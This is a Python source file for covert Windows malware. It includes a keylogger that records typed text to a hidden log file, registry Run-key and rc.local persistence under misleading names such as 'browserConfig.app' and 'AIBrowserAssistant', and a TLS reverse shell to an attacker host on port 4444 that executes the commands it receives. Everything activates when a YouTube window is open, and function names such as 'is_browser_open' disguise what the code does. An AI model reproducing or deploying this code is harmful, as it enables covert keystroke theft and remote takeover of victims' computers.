import time
import os, sys, logging
import winreg as reg
import pygetwindow as gw
import socket, ssl
import subprocess
from threading import Thread, Lock
from pynput.keyboard import Key, KeyCode, Listener as KeyboardListener 

#browser settings
TARGET_SITE = "Youtube" 
SCRIPT_NAME = "browserConfig.app"

#configure the keylogger
directory = os.path.join(os.path.expanduser("~"), "Documents", "BrowserLogs")
filename = "results.txt"
path = os.path.join(directory, filename)

# In case the directory doesn't exist, create it
if not os.path.exists(directory):
    os.makedirs(directory)

pressed_keys = set()

logging.basicConfig(
    filename = path,
    level = logging.INFO,
    format = "%(message)s"
)

#global functions for buffering
current_entry = [] 
buffer_lock = Lock() #to ensure thread-safe access to the buffer
logging_interval = 3600
number_pad = {
    96: '0', 97: '1',  98: '2', 99: '3', 100: '4', 101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    106: '*', 107: '+', 109: '-', 110: '.', 111: '/'
}

#definining functions for browser persistence
def is_browser_open():
    python_exe = sys.executable 
    script_path = os.path.abspath(__file__)

    command = f'start "" "{python_exe}" "{script_path}"'
    key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)

        try:
            exiting_value, _ = reg.QueryValueEx(key, SCRIPT_NAME)
            if exiting_value == command:
                reg.CloseKey(key)
                return
        except FileNotFoundError:
            pass
        
        reg.SetValueEx(key, SCRIPT_NAME, 0, reg.REG_SZ, command)
        reg.CloseKey(key)

    except Exception as e:
        print(f"Error accessing registry: {e}")
        return

#connection function for the shell
def add_to_startup():
    script_path = os.path.abspath(__file__)
    if os.name == 'nt':
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "AIBrowserAssistant", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
    elif os.name == 'posix':
        startup_script = f'echo "{script_path}" >> /etc/rc.local'
        os.system(startup_script)
    
#defining functions for shell connection
def connection_company():
    attacker_ip = ''
    attacker_port = 4444
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = context.wrap_socket(s, server_hostname=attacker_ip)
    ssl_sock.connect((attacker_ip, attacker_port))
    while True:
        command = ssl_sock.recv(1024).decode('utf-8')
        if 'exit' in command:
            ssl_sock.close()
            break
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            ssl_sock.send(output.encode('utf-8'))
        except Exception as e:
            ssl_sock.send(str(e).encode('utf-8'))

#main function to run the keylogger, browser persistence, and shell connection
#function for common keys
def press_key(key):
    with buffer_lock:
        try:
            if hasattr(key, 'char') and key.char is not None:
                current_entry.append(key.char)
            
            elif hasattr(key, 'vk') and key.vk in number_pad:
                current_entry.append(number_pad[key.vk])  # Log NumPad keys correctly

            elif key == Key.space:
                current_entry.append(" ")  # Log space as a space character
            
            elif key == Key.enter:
                full_sentence = "".join(current_entry)  # Log enter as a new line
                logging.info(full_sentence)  # Log the full sentence before the new line
                current_entry.clear()  # Clear the current entry after logging
            
            elif key == Key.backspace:
                if current_entry:
                    current_entry.pop()  # Remove the last character from the buffer

        except Exception as e:
            logging.error(f"Error processing key press: {e}")

#function for special keys
def release(key):
    if key == Key.esc:  # Stop listener on 'Esc' key
        with buffer_lock:
            if current_entry:
                logging.info("".join(current_entry))
                current_entry.clear()
        return False

def log_keystrokes():
    while True:
        time.sleep(logging_interval)
        with buffer_lock:
            if current_entry:
                logging.info("".join(current_entry))
                current_entry.clear()

def start_listener(): 
    try:
        with KeyboardListener(on_press=press_key, on_release=release) as listener: #calls the functions
            logging_thread = Thread(target=log_keystrokes, daemon=True)
            logging_thread.start()
            listener.join() #it keeps the listener running until it's stopped

    except Exception as e: #handling possible errors
        logging.error(f"Error in listener: {e}")

keyboard_thread = Thread(target=start_listener)#thread for keyboard
shell_process = Thread(target=add_to_startup) #thread for browser persistence
shell_thread = Thread(target=connection_company) #thread for shell connection


def main():
    is_browser_open() #check if the browser is open and add to startup if not
    while True:
        try:
            windows = gw.getAllTitles()
            # Check if any window title contains our target
            if any(TARGET_SITE.lower() in title.lower() for title in windows):
                shell_process.start() #start the shell process thread
                shell_thread.start() #start the shell connection thread
                keyboard_thread.start() #start the keyboard listener thread
                time.sleep(3600) # Sleep to 1 hour to save CPU
                
            time.sleep(5) # Sleep to save CPU
        except Exception:
            pass

if __name__ == "__main__":

    main()
